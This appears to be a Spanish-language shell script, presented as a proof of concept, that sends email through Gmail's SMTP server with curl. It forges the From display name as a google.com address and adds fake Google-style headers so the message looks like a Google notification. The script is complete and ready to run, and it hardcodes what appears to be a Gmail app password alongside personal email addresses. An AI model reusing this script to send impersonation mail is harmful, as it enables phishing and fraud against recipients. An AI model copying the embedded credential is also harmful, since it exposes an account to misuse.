#!/bin/sh
################################################################################
# Prueba de concepto POC, envio con script bash shell gmail
# Script en Bash Shell 1.0 usando curl con heredo
# Simula email, Spoff en el display name a google.com,  nombre a mostar
# El SMTP de gmail imprime y aparecera la cuenta realde origen a continuacion
# (R) hackingyseguridad.com 2026
# @antonio_taboada
################################################################################

real_sender="antonio.taboada@gmail.com"
gapp="satk lnxi lpti vav"

# simula suplantar en display_name , nombre que se muestra como remitente
display_name="notificaciones@google.com <notificaciones@google.com>"
# display_name , AQUI es donde ponemos cuenta de email que queremos que sea visible: el nombre a mostrar y la <direccion de email>

sub="Asunto del email. POC simula spoff email ...!!!  "

# cuenta de email de destino:
receiver="antonio.taboada@telefonica.net"

body="prueba ed envio, esto es una prueba de concepto POC - mas informacion en: https://github.com/hackingyseguridad/email/"

response=$(curl -v --url 'smtps://smtp.gmail.com:465' --ssl-reqd \
    --mail-from "$real_sender" \
    --mail-rcpt "$receiver" \
    --user "$real_sender:$gapp" \
    -T /dev/stdin 2>&1 <<EOF
From: $display_name
To: $receiver
Subject: $sub
Date: $(date -R)
Message-ID: <$(date +%s%N)@google.com>
X-Google-Notification: 1
X-Priority: 1

$body
EOF
)

if [ $? -eq 0 ]; then
    echo "enviado!"
    echo "Remitente visible: $display_name"
    echo "Remitente real (SMTP): $real_sender"
else
    echo "Error!"
    echo "Respuesta: $response"
fi



